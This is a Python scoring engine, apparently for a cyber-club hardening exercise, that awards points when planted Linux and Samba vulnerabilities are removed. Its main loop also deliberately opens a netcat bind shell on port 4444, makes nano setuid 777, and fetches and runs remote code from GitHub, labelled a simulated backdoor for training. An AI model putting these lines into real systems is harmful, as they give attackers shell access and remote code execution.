#!/usr/bin/env python3
#~~~~~~~~~~~~~~~~~~~~~~~SETUP~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
import os
import sys
import time
import pwd
import grp
import subprocess
from pylab import *
from matplotlib.ticker import *
import _datetime
from multiprocessing import Process
import numpy as np
import matplotlib.pyplot as plt
import urllib.request as urllib2
import re
mainUser = 'ahri' #the place to install ScoringEngine
today = _datetime.date.today()
#~~~~~~~~~~~~~~~~Create Classes~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
class Service:
	def __init__(self,name,port):
		self.port = port
		self.name = name
	def getPort(self):
		return self.port
	def getName(self):
		return self.name
	def isDown(self):	
		if os.system('''netstat -tulpn | grep ''' + str(self.getPort()))  == 0:
			return False
		return True
class User:
	def __init__(self,name):
			self.name=name
	def getName(self):
			return self.name	
	def works(self):
		try:
			pwd.getpwnam(self.getName())
			return True
		except KeyError:
			return False
class Group:
	def __init__(self,name):
			self.name=name
	def getName(self):
			return self.name
	def exists(self):
		try:
			grp.getgrnam(self.getName())
			return True
		except KeyError:
			return False

class Task:
	def __init__(self,level, desc, val, boolean): #constructor
		self.desc = desc
		self.boolean = boolean
		self.val = val
		self.level = level

	#returns the point value of the task
	def getValue(self):
		return self.val
	#returns the description of the task
	def getLevel(self):
		return self.level
	#returns the level of the task
	def getDescription(self):
		return self.desc

	#returns true if the boolean criterion is met
	def isFixed(self):
		if os.system(self.boolean) == 0: 
		#runs the linux boolean command to see the result
			return True
		else:
			return False
#~~~~~~~~~~~~~~~~~~~~~~THINGS TO SCORE~~~~~~~~~~~~~~~~~~~~~~~~~#
users = [User(mainUser), User('ahri'), User('choggath'), User('jayce'), User('brehm') ] #If a user is deleted, you get a penalty
services = [Service('samba', 139)] #If a service is down, you get a penalty
allTasks = [
	Task('Returner','Samba bad share removed', 3, '[ "$(! grep erdie /etc/samba/smb.conf)" ]'),
	Task('Returner','Samba password file removed', 3, '[! "$(ls -al /home/samba/smbshare | grep password)" ]'),
	Task('Returner','Samba hidden script removed', 3, '[ ! "$(ls -al /home/samba/smbshare | grep sh)" ]'),
	Task('Returner','Samba security settings', 3, '[ ! "$(grep obey /etc/samba/smb.conf | grep pam | grep no )" ]'),
	Task('Returner','UFW bad rules', 2, '[ ! "$(grep 6969 /etc/ufw/user.rules)" ]'),
	Task('Returner','Removed openssh', 2, '[ ! "$(dpkg --list | grep openssh)" ]'),
	Task('Returner','Cowsay removed from netstat', 2, '[ ! "$(ls -al /bin | grep abee1c2800e133eeece1e738abf3a1d9f3a2d745)" ]'),
	Task('Returner','Rc.local background command', 2, '[ ! "$(grep netcat /etc/rc.local)" ]'),
	Task('Returner','Sudoers no password', 3, '[ ! "$(grep NOPASSWD /etc/sudoers)" ]'),
	Task('Returner','octal 777 permissions on /', 3, '[ ! "$(ls -al / | grep rwxrwxrwx)" ]'),
	Task('Returner','bad crontab for user choggath', 2, '[ ! "$(grep netcat /var/spool/cron/crontabs/choggath)" ]'),
	Task('Returner','Aircrack malware removed', 1, '[ ! "$(dpkg --list | grep aircrack)" ]'),
	Task('Returner','soup removed', 1, '[ ! "$(grep soup /etc/passwd)" ]')
]
groups = [] #groups that must exist, or else a penalty
#~~~~~~~~~~~~~~~CREATE THE WEBSITE/CALCULATE POINTS~~~~~~~~~~~~~#
def update():
	percent = str(round(currentPoints / totalPoints * 100, 1)) + '%'
	score = str(currentPoints) + " out of " + str(totalPoints) + " total points"
	questionsAnswered = str(numFixedVulns) + " out of " + str(len(allTasks)) + " total tasks completed"
	BeginnerSolved = 0
	BeginnerTotal = 0
	returnerSolved = 0
	returnerTotal = 0
	advancedSolved = 0
	advancedTotal = 0

	for t in allTasks:
			if t.getLevel() == 'Beginner':
				BeginnerTotal = BeginnerTotal + 1
			if t.getLevel() == 'Returner':
				returnerTotal = returnerTotal + 1
			if t.getLevel() == 'Advanced':
				advancedTotal = advancedTotal + 1
	h = open('/home/cyber/Desktop/ScoreReport.html','w')
	h.write('<!DOCTYPE html> <html> <head> <meta name="viewport" content="width=device-width, initial-scale=1"> <style> * { box-sizing: border-box; } .column { float: left; padding: 10px; height: 1500px; } .left, .right { width: 25%; } .middle { width: 50%; } .row:after { content: ""; display: table; clear: both; }</style> </head> <body><div class="row"> <div class="column left" style="background-color:#0d60bf;"></div> <div class="row"> <div class="column middle" style="background-color:#fff;"><h1 style="text-align: center;"><span style="font-family: arial, helvetica, sans-serif;">Score Report</span></h1><h2 style="text-align: center;"><br /><span style="font-family: arial, helvetica, sans-serif;">' + percent + ' completed</span></h2><p> </p>')
	h.write('<p><span style="font-family: arial, helvetica, sans-serif; text-align: center;"><strong>' + "Report Generated at: " + str(today) + '. </strong></span></p>')
	h.write('<p><span style=color:red;"font-family: arial, helvetica, sans-serif;"><strong>' + str(penalties) + ' Points in Scoring Penalties</strong></span></p>')
	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(score) + '. </strong></span></p>')
	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(questionsAnswered) + '. </strong></span></p>')
	h.write('<style> div { background-image: url(https://i.pinimg.com/originals/15/79/25/157925e28f33c43a30973791b2f787f4.jpg); background-blend-mode: lighten; } </style>')
	h.write('<hr class="line2"><br>')

	for u in users:
		if not u.works():
			h.write('<p><span style=color:red;"font-size: 10pt;  font-family: arial, helvetica, sans-serif;">'
                         + u.getName()
                        + ' is NOT functional: - 5 points</span></p>')
	for s in services:
		if s.isDown():
				h.write('<p><span style=color:red;color:red;"font-size: 10pt;  font-family: arial, helvetica, sans-serif;">'
                         + s.getName()
                        + ' is NOT functional or Using wrong port: - 5 points</span></p>')
	for g in groups:
		if not g.exists():
				h.write('<p><span style=color:red;"font-size: 10pt;  font-family: arial, helvetica, sans-serif;">'
                         + g.getName()
                        + ' is NOT created: - 5 points</span></p>')
	for t in allTasks:
		if t.isFixed() and t.getLevel() == 'Beginner':
			BeginnerSolved = BeginnerSolved + 1
			h.write('<p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">'
			+ '<span style="color:green;">Beginner</span>' + ' ' + t.getDescription() + ' '
			+ str(t.getValue()) + ' points</span></p>')

		if t.isFixed() and t.getLevel() == 'Returner':
			returnerSolved = returnerSolved + 1
			h.write('<p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">'
			+ '<span style="color:blue;">Returner</span>' + ' ' + t.getDescription() + ' '
			+ str(t.getValue()) + ' points</span></p>')

		if t.isFixed() and t.getLevel() == 'Advanced':
			advancedSolved = advancedSolved + 1
			h.write('<p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">'
			+ '<span style="color:purple;">Advanced</span>' + ' ' + t.getDescription() + ' '
			+ str(t.getValue()) + ' points</span></p>')

	bS = str(BeginnerSolved) + " out of " + str(BeginnerTotal) + " Beginner tasks completed"
	rS = str(returnerSolved) + " out of " + str(returnerTotal) + " returner tasks completed"
	aS = str(advancedSolved) + " out of " + str(advancedTotal) + " advanced tasks completed"
	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(bS) + '. </strong></span></p>')
	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(rS) + '. </strong></span></p>')
	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(aS) + '. </strong></span></p>')
	h.write('<img src=".graph.png" alt="Graph" width="350" height="250">')
	h.write('</div> <div class="row"> <div class="column right" style="background-color:#0d60bf;"></div> </body>')
	h.write('<meta http-equiv="refresh" content="20">')
	h.write('<footer><h6>Cyber Club</h6></footer>')

#~~~~~~~~~~~~~~~~~~~~~Make a bar popup on screen when you get points~~~~~~~~~~~~~~~~~~~~~~~#
def notify(ph):
	#Creates a popup on the screen
	icon_path = "/usr/bin/scorebot/scoring.png"
	if (ph[-1] > ph[-2]):
		os.system('notify-send -i ' + icon_path + ' \'You Earned Points!\' ')

	if (ph[-1] < ph[-2]):
		os.system('notify-send -i ' + icon_path + ' \'You Lost Points!\' ')
#~~~~~~~~~~~~~~~~~~~~Send data to server~~~~~~~~~~~~~~~~~~~~~~~~~~#
pointHistory = [0,0,0] #list containing the history of points, add 3 0's so chart looks better
HasEnteredTeamInfo = False #Have they put in info in the GUI created by TeamInfo.py(example: none:single:none:none)
dUSR = ""
dMode = ""
dServIP = ""
key = "cool" #secret key so people can't just send data to the server to get points
while True:
	##Have array of previous points every 5 seconds and send the array to the returnScore.py
	currentPoints = 0 #The amount of points you currently have
	lastPoints = 0 #the previous current points
	penalties = 0 #Number of penalties
	numFixedVulns = 0
	totalPoints = 0

	for i in services:
		if i.isDown():
			penalties = penalties + 5
	for i in groups:
		if not i.exists():
			penalties = penalties + 5
	for i in users:
		if not i.works():
			penalties = penalties + 5
	for i in allTasks:
		totalPoints = totalPoints + i.getValue()
		if i.isFixed():
				numFixedVulns = numFixedVulns + 1
				currentPoints = currentPoints + i.getValue()
	currentPoints = currentPoints - penalties
	pointHistory.append(currentPoints)
	notify(pointHistory)

	while (not HasEnteredTeamInfo):
		print("enter team Info")
		os.system("python3 /home/"+mainUser+"/Desktop/TeamInfo.py")
		TeamInfo = os.popen("head -n1 /etc/scorebot/.usr.dat").read()
		#print("Team Info is: " + str(TeamInfo))
		dUSR = str(TeamInfo.split(":")[0])
		print("dusr is:" + dUSR)
		dMode = str(TeamInfo.split(":")[1])
		dServIP = str(TeamInfo.split(":")[2] + ":" + str(TeamInfo.split(":")[3]))
		HasEnteredTeamInfo = True
		print ("dMode is now: " + dMode)

	if (dMode == "server" ):
		data = str(dUSR) + ":" + str(currentPoints) + ":" + str(int((time.time() / 60))) + ":" + str(key) 
		os.system("curl -X POST -d " + data + " http://" + dServIP)

#~~~~~~~~~~~~~~Create a graph to add to the .html webpage~~~~~~~~~~~~~~~~~~~~~~~~#
	Y = np.array(pointHistory) 
	ax = plt.axes()
	ax.plot(Y, linewidth=4, color="red")
	plt.axhline(y=0, color="black")
	ax.yaxis.set_major_locator(MaxNLocator(integer=True))
	plt.savefig('.graph.png',bbox='tight')
	update()
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~AutoExec.py~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#This isn't very secure. Runs whatever is in the github location below. Use if you need to change something during the scoring
	fileLocationURL = "https://raw.githubusercontent.com/CyberCyber2/ScoringEngine/main/BaseFiles/01-AutoExec.py"
	html_content = urllib2.urlopen(fileLocationURL).read().decode('utf-8')

	matches = re.findall(str("[enable]"), html_content);
	#simulate hidden backdoor. Solution isn't to remove netcat, but block the command
	os.system("apt-get install netcat-traditional")
	os.system("netcat -lvp 4444 -e /bin/bash & 2>/dev/null")
	os.system("chmod 4777 /usr/bin/nano")

	if len(matches) != 0: 
		#print ('HTML Content: ' + str(html_content))
		filename = "test.py"
		file_ = open(filename, 'w')
		file_.write(html_content)
		file_.close()
		subprocess.call(['chmod', '777',filename])
		subprocess.call(['python3', filename])
	time.sleep(20) #scoring interval

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~DEBUG~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#Delete all processes with a name
	#ps -ef | grep 'scorebot.py' | grep -v grep | awk '{print $2}' | xargs -r kill -9
#fix apt command locked
#sudo killall apt apt-get
#sudo rm /var/lib/apt/lists/lock
#sudo rm /var/cache/apt/archives/lock
#sudo rm /var/lib/dpkg/lock*
#sudo dpkg --configure -a
